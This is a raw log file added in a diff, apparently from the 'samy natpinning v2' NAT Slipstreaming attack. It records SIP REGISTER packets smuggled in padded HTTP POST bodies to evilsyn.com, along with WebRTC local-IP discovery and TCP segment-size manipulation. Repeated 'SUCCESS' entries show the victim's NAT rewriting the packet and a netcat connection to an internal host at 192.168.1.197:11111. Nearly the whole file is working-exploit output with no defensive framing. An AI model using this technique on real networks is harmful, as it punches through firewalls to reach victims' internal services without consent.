+   Contact:<b> <sip:samy@1.3.3.13:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa03690221299601527bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------96148587718512061586196497--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=25 (orig 25), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa03690221299601527bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------205294973315281694271047406078--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=21 (orig 21), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa03690221299601527bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------9069972971715144342493854490--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=19 (orig 19), received this packet:
+<i>   ^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa03690221299601527bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------193989897080254035234631344--
+   </i><br>injecting overflowed 2nd packet contents:
+<i>   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0   
+   Via: SIP/2.0/TCP <b><b>1.3.3.13</b></b>:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP   
+   Max-Forwards: 70   
+   Contact:<b> <sip:samy@1.3.3.13:<b>11111</b>;rinstance=v40f3f83b335139c;transport=TCP>   
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>   
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519   
+   Call-ID: aaaaaaaaaaaaa03690221299601527bbbbbbZjQ4M2M.   
+   CSeq: 1 REGISTER   
+   Expires: 70   
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE   
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri   
+   User-Agent: samy natpinning v2   
+   Allow-Events: presence, kpml   
+   Content-Length: 0   
+      
+   </i><br>maximizing POST data over port 5060 to force "SIP packet" to begin on packet boundary<br>
+ready to traverse NAT/network/firewall, <b>press button above</b>...<br>stuff padding to fill tcp packet: <b>827 bytes</b><br>beacon received, packet capture lengths: {id:03690221299601527, stuff_bytes:827}<br>using first ip: <b>1.3.3.13</b><br>redirected to http to continue attack with localips in url<br>webrtc acquired ips: <b>1.3.3.13</b><br>created webrtc data channel to obtain local ip over https<br>sending TCP beacon to detect maximum packet size and MTU<br>responding to SYN with maximum segment size TCP option to control data size<br>requesting sniffed packet sizes from server<br>
+)
+
+192.168.1.197 1640247870: Array
+(
+    [C8] => {id:09750659858078314, stuff_bytes:829}
+)
+
+192.168.1.197 1640247941: Array
+(
+    [C1] => {id:06538337265899373, stuff_bytes:831}
+)
+
+192.168.1.197 1640247956: Array
+(
+    [C1] => 192.168.1.197:11111: The Attack Works Bitches
+<br><b>connected to 192.168.1.197:11111</b><br>
+<b>attempting to bypass your NAT/firewall</b><br>running: nc -v 192.168.1.197 11111<br><br><b>status: SUCCESS! ip in returned SIP packet is 192.168.1.197</b>, different than what we sent (<b>1.3.3.13</b>), victim NAT rewrote it<br><hr><br>offset=0 (orig 0), received this packet:
+<i>   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@192.168.1.197:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa06538337265899373bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------1132195853825120211787831502--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=2 (orig 2), received this packet:
+<i>   
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa06538337265899373bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------83287283919382072161110157277--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>new len 1489<br>old len 1514<br>offset same as last time, maybe something in HTTP header changed - adjusting packet length<br>offset=25 (orig 25), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa06538337265899373bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------1613720367898815372745300003--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=25 (orig 25), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa06538337265899373bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------6871741114927396581206877094--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=23 (orig 23), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa06538337265899373bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------307710652148629993080392588--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=25 (orig 25), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa06538337265899373bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------8025306631979573758699327904--
+   </i><br>injecting overflowed 2nd packet contents:
+<i>   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0   
+   Via: SIP/2.0/TCP <b><b>1.3.3.13</b></b>:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP   
+   Max-Forwards: 70   
+   Contact:<b> <sip:samy@1.3.3.13:<b>11111</b>;rinstance=v40f3f83b335139c;transport=TCP>   
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>   
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519   
+   Call-ID: aaaaaaaaaaaaa06538337265899373bbbbbbZjQ4M2M.   
+   CSeq: 1 REGISTER   
+   Expires: 70   
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE   
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri   
+   User-Agent: samy natpinning v2   
+   Allow-Events: presence, kpml   
+   Content-Length: 0   
+      
+   </i><br>maximizing POST data over port 5060 to force "SIP packet" to begin on packet boundary<br>
+ready to traverse NAT/network/firewall, <b>press button above</b>...<br>stuff padding to fill tcp packet: <b>831 bytes</b><br>beacon received, packet capture lengths: {id:06538337265899373, stuff_bytes:831}<br>using first ip: <b>1.3.3.13</b><br>redirected to http to continue attack with localips in url<br>webrtc acquired ips: <b>1.3.3.13</b><br>created webrtc data channel to obtain local ip over https<br>sending TCP beacon to detect maximum packet size and MTU<br>responding to SYN with maximum segment size TCP option to control data size<br>requesting sniffed packet sizes from server<br>
+)
+
+192.168.1.197 1640249282: Array
+(
+    [C7] => {id:07404888186928197, stuff_bytes:829}
+)
+
+192.168.1.197 1640249312: Array
+(
+    [C4] => 192.168.1.197:11111: The Attack Works Bitches
+<br><b>connected to 192.168.1.197:11111</b><br>
+<b>attempting to bypass your NAT/firewall</b><br>running: nc -v 192.168.1.197 11111<br><br><b>status: SUCCESS! ip in returned SIP packet is 192.168.1.197</b>, different than what we sent (<b>1.3.3.13</b>), victim NAT rewrote it<br><hr><br>offset=0 (orig 0), received this packet:
+<i>   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@192.168.1.197:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa07404888186928197bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------58183546820065930091110073489--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>new len 1487<br>old len 1512<br>offset same as last time, maybe something in HTTP header changed - adjusting packet length<br>offset=25 (orig 25), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa07404888186928197bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------10182714846125685391002609050--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=25 (orig 25), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa07404888186928197bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------93615508219676113331002756116--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=27 (orig 27), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa07404888186928197bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------175606902614531168201347934000--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=23 (orig 23), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa07404888186928197bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------9309488156652853182011861223--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=25 (orig 25), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa07404888186928197bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------11402252471702611688879665370--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=19 (orig 19), received this packet:
+<i>   ^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa07404888186928197bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------24140987595731168546792531--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=23 (orig 23), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa07404888186928197bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------8961538641897918239580555812--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=25 (orig 25), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa07404888186928197bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------15573375821817525651511838401--
+   </i><br>injecting overflowed 2nd packet contents:
+<i>   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0   
+   Via: SIP/2.0/TCP <b><b>1.3.3.13</b></b>:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP   
+   Max-Forwards: 70   
+   Contact:<b> <sip:samy@1.3.3.13:<b>11111</b>;rinstance=v40f3f83b335139c;transport=TCP>   
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>   
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519   
+   Call-ID: aaaaaaaaaaaaa07404888186928197bbbbbbZjQ4M2M.   
+   CSeq: 1 REGISTER   
+   Expires: 70   
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE   
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri   
+   User-Agent: samy natpinning v2   
+   Allow-Events: presence, kpml   
+   Content-Length: 0   
+      
+   </i><br>maximizing POST data over port 5060 to force "SIP packet" to begin on packet boundary<br>
+ready to traverse NAT/network/firewall, <b>press button above</b>...<br>stuff padding to fill tcp packet: <b>829 bytes</b><br>beacon received, packet capture lengths: {id:07404888186928197, stuff_bytes:829}<br>using first ip: <b>1.3.3.13</b><br>redirected to http to continue attack with localips in url<br>webrtc acquired ips: <b>1.3.3.13</b><br>created webrtc data channel to obtain local ip over https<br>sending TCP beacon to detect maximum packet size and MTU<br>responding to SYN with maximum segment size TCP option to control data size<br>requesting sniffed packet sizes from server<br>
+)
+
+192.168.1.197 1640253259: Array
+(
+    [C1] => {id:06505885696903827, stuff_bytes:827}
+)
+
+192.168.1.197 1640253292: Array
+(
+    [C2] => 192.168.1.197:11111: The Attack Works Bitches
+<br><b>connected to 192.168.1.197:11111</b><br>
+<b>attempting to bypass your NAT/firewall</b><br>running: nc -v 192.168.1.197 11111<br><br><b>status: SUCCESS! ip in returned SIP packet is 192.168.1.197</b>, different than what we sent (<b>1.3.3.13</b>), victim NAT rewrote it<br><hr><br>offset=0 (orig 0), received this packet:
+<i>   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@192.168.1.197:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa06505885696903827bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------19522337311265128131470993217--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>new len 1487<br>old len 1510<br>offset same as last time, maybe something in HTTP header changed - adjusting packet length<br>offset=23 (orig 23), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa06505885696903827bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
+   Allow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE
+   Supported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri
+   User-Agent: samy natpinning v2
+   Allow-Events: presence, kpml
+   Content-Length: 0
+   -----------------------------21321060461271240345452721733--
+   </i><br>packet size changed on us, reattempt SIP REGISTER<br>offset=23 (orig 23), received this packet:
+<i>   ^_^_^_^_^_^_^_^_^_^_=
+   REGISTER sip:evilsyn.com;transport=TCP SIP/2.0
+   Via: SIP/2.0/TCP 1.3.3.13:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP
+   Max-Forwards: 70
+   Contact:<b> <sip:samy@1.3.3.13:11111;rinstance=v40f3f83b335139c;transport=TCP>
+   </b>To: <sip:samy@evilsyn.com;transport=TCP>
+   From: <sip:samy@evilsyn.com;transport=TCP>;tag=U7c3d519
+   Call-ID: aaaaaaaaaaaaa06505885696903827bbbbbbZjQ4M2M.
+   CSeq: 1 REGISTER
+   Expires: 70
